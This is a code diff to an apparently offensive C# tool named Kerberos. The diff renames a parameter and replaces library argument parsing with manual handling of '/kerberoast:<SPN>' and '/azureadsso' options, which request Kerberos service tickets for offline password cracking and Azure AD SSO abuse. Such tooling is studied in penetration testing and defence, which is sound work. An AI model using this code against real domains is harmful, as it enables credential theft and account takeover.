@@ -12,14 +12,14 @@ namespace Kerberos
 {
     class Program
     {
-        static byte[] GetToken(string spn)
+        static byte[] GetToken(string servicePrincipalName)
         {
             string domain = System.Environment.UserDomainName;
             using (var domainContext = new PrincipalContext(ContextType.Domain, domain))
             {
-                using (var foundUser = UserPrincipal.FindByIdentity(domainContext, IdentityType.SamAccountName, spn))
+                using (var foundUser = UserPrincipal.FindByIdentity(domainContext, IdentityType.SamAccountName, servicePrincipalName))
                 {
-                    KerberosSecurityTokenProvider K1 = new KerberosSecurityTokenProvider(spn);
+                    KerberosSecurityTokenProvider K1 = new KerberosSecurityTokenProvider(servicePrincipalName);
                     KerberosRequestorSecurityToken T1 = K1.GetToken(TimeSpan.FromMinutes(1)) as KerberosRequestorSecurityToken;
                     byte[] requestBytes = T1.GetRequest();
                     return requestBytes;
@@ -105,17 +105,36 @@ namespace Kerberos
                 return 1;
             }
         }
-        static int Main(string[] args)
+        static void Help()
         {
-            Parser.Default.ParseArguments<Options>(args)
-                .WithParsed<Options>(o =>
-                {
-                    Kerberoasting(o.ServicePrincipalName);
-                });
-            return 0;
+            Console.WriteLine("Please use an argument like kerberoast of azureadsso...");
+            Console.WriteLine("");
+            Console.WriteLine("Example: Kerberos.exe /kerberoast:<ServicePrincipalName>");
+            Console.WriteLine("Example: Kerberos.exe /azureadsso");
+            System.Environment.Exit(1);
         }
         static void Main(string[] args)
         {
+            // This is an ugly way to check arguments, but I did not want to use dependencies.
+            // Feel free to fork the project and come with a better solution.
+            if(args.Length == 0 | args.Length > 2)
+            {
+                Help();
+            }
+            String argument = args[0].ToString().ToLower();
+            if (argument.StartsWith("/kerberoast:"))
+            {
+                String ServicePrincipalName = argument.Remove(0, 12);
+                Kerberoasting(ServicePrincipalName);
+            }
+            else if (argument.StartsWith("/azureadsso"))
+            {
+                GetToken("HTTP/autologon.microsoftazuread-sso.com");
+            }
+            else
+            {
+                Help();
+            }
         }
     }
 }
